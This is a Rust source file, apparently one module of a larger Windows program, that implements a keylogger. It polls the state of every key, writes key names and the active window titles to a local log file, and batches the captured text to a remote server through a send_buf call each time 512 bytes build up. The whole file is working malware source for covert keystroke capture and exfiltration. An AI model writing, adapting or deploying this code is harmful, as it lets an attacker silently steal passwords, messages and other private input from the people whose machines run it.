use winapi::um::winuser;
use winapi::shared::windef::HWND;
use winapi::um::winuser::{MAPVK_VK_TO_VSC, GetKeyNameTextW, GetForegroundWindow, GetWindowTextW};
use std::fs::OpenOptions;
use std::io::Write;
use std::path::Path;
use crate::network::send_buf;
use std::net::SocketAddr;

pub fn start<T: AsRef<Path>>(server: SocketAddr, log_name: T) {
    let mut f = OpenOptions::new()
        .append(true)
        .create(true)
        .open(log_name)
        .expect("Could not create log for KL");

    let mut last_window = String::new();
    let mut buf: Vec<u8> = Vec::new();

    loop {
        for key in 8u32..191 {
            unsafe {
                if winuser::GetAsyncKeyState(key as i32) == -32767 {
                    let fg_window: HWND = GetForegroundWindow();
                    let mut window_title = [0u16; 1024];
                    let window_title_len = GetWindowTextW(fg_window, window_title.as_mut_ptr(), 1024) as usize;
                    let window_title = format!("\n{}\n", String::from_utf16_lossy(&window_title[0..window_title_len]));

                    if window_title != last_window {
                        if let Err(e) = f.write_all(window_title.as_bytes()) {
                            println!("Error writting to file: {}", e);
                        }

                        // We push data into buffer
                        for b in window_title.as_bytes() {
                            buf.push(*b);
                        }

                        last_window = window_title;
                    }

                    let mut name = [0u16; 1024];
                    let scan_code = winuser::MapVirtualKeyW(key, MAPVK_VK_TO_VSC) as i32;

                    let length = GetKeyNameTextW(scan_code << 16, name.as_mut_ptr(), 1024) as usize;
                    if  length > 0 {
                        let data = format!("[{}]", String::from_utf16_lossy(&name[0..length]));
                        if let Err(e) = f.write_all(data.as_bytes()) {
                            println!("Error writting to file: {}", e);
                        }

                        // We push data into buffer
                        for b in data.as_bytes() {
                            buf.push(*b);
                        }

                        // If buffer is big enough, we send it to the server
                        if buf.len() >= 512 {
                            send_buf(server, &buf);
                            buf.clear();
                        }
                    } else {
                        if let Err(e) = f.write_all("[ERROR]".as_bytes()) {
                            println!("Error writting to file: {}", e);
                        }
                    }
                }
            }
        }
    }
}